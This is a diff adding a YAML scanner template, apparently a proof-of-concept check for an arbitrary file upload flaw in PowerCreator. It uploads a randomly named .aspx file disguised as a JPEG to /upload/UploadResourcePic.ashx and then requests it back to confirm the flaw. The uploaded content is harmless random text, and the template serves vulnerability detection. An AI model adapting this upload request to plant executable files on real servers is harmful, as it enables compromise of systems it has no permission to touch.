@@ -1,0 +1,24 @@
+name: poc-yaml-powercreator-arbitrary-file-upload
+set:
+  rand: randomInt(1000, 9999)
+  content: randomLowercase(8)
+  randname: randomLowercase(4)
+rules:
+  - method: POST
+    path: /upload/UploadResourcePic.ashx?ResourceID={{rand}}
+    follow_redirects: false
+    headers:
+      Content-Type: multipart/form-data; boundary=---------------------------20873900192357278038549710136
+      Content-Disposition: form-data;name="file1";filename="{{randname}}.aspx";
+    body: "-----------------------------20873900192357278038549710136\nContent-Disposition: form-data; name=\"file1\"; filename=\"{{randname}}.aspx\"\nContent-Type: image/jpeg\n\n{{content}}\n-----------------------------20873900192357278038549710136--"
+    search: |
+      (?P<path>.+?).ASPX
+    expression: response.status == 200 && response.body.bcontains(b".ASPX")
+  - method: GET
+    path: /ResourcePic/{{path}}.ASPX
+    follow_redirects: false
+    expression: response.status == 200
+detail:
+  author: MrP01ntSun(https://github.com/MrPointSun)
+  links:
+    - https://xz.aliyun.com/t/8478#reply-15684
